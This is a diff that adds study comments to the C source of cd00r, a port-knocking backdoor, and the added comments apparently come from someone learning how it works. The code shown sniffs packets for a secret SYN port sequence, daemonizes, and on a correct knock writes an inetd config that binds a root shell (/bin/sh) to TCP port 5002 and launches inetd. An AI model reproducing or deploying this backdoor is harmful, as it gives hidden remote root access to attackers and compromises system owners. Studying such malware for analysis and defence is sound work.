@@ -166,6 +166,7 @@
 #include <pcap.h>
 #include <net/bpf.h>
 
+
 #define ETHLENGTH 	14
 #define IP_MIN_LENGTH 	20
 #define CAPLENGTH	98
@@ -188,10 +189,10 @@ struct iphdr {
 
 struct tcphdr {
         unsigned short int 	src_port;
-	unsigned short int 	dest_port;
+	    unsigned short int 	dest_port;
         unsigned long int 	seq_num;
         unsigned long int 	ack_num;
-	unsigned short int	rawflags;
+	    unsigned short int	rawflags;
         unsigned short int 	window;
         long int 		crc_a_urgent;
         long int 		options_a_padding;
@@ -216,7 +217,9 @@ struct in_addr	sender;
  * This function can be changed to whatever you like to do when the system
  * accepts the code 
  ********/
-void cdr_open_door(void) {
+
+// this will execute when the 'secret knock' is recognized
+void cdr_open_door(void) { 
     FILE	*f;
 
     char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};
@@ -247,7 +250,7 @@ void cdr_open_door(void) {
     fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
     fclose(f);
 
-    execv("/usr/sbin/inetd",args);
+    execv("/usr/sbin/inetd",args); // will execute inetd program
 #ifdef DEBUG
     printf("Strange return from execvp() !\n");
 #endif DEBUG
@@ -357,6 +360,8 @@ int main (int argc, char **argv) {
      * see tcpdump(1)
      */
     
+    // for loop to create the filter based on port number sequence
+    //  (is this so that we will only listen on these ports for packet capturing??)
     for (i=1;i<cportcnt;i++) {
 	if (cports[i]) {
 	    memset(&portnum,0,6);
@@ -428,6 +433,7 @@ int main (int argc, char **argv) {
 #endif DEBUG
 
     /* go daemon */
+    // this is so cd00r is running on a different process id
     switch (i=fork()) {
 	case -1:
 	    if (cdr_noise)
@@ -442,6 +448,7 @@ int main (int argc, char **argv) {
     }
 
     /* main loop */
+    // infinite loop unless error, exit, or successfully port knocked
     for(;;) {
 	/* if there is no 'next' packet in time, continue loop */
 	if ((pdata=(u_char *)pcap_next(cap,phead))==NULL) continue;
@@ -460,6 +467,7 @@ int main (int argc, char **argv) {
 	if (!(ntohs(tcp->rawflags)&0x02)) continue;
 	/* if it is a SYN-ACK packet, continue */
 	if (ntohs(tcp->rawflags)&0x10) continue;
+    // ^^ because we are only listening for SYN messages from specified ports
 
 #ifdef CDR_ADDRESS
 	/* if the address is not the one defined above, let it be */
@@ -479,6 +487,8 @@ int main (int argc, char **argv) {
 	/* it is one of our ports, it is the correct destination 
 	 * and it is a genuine SYN packet - let's see if it is the RIGHT
 	 * port */
+
+    // check if the port with SYN packet is the one we want in the sequence (or the start)
 	if (ntohs(tcp->dest_port)==cports[actport]) {
 #ifdef DEBUG
 	    printf("Port %d is good as code part %d\n",ntohs(tcp->dest_port),
@@ -500,9 +510,11 @@ int main (int argc, char **argv) {
 #endif CDR_SENDER_ADDR
 	    /* it is the rigth port ... take the next one
 	     * or was it the last ??*/
+
+        // update actport and check if it is the last one in the sequence
 	    if ((++actport)==cportcnt) {
 		/* BINGO */
-		cdr_open_door();
+		cdr_open_door(); // knock was successful
 		actport=0;
 	    } /* ups... some more to go */
 	} else {
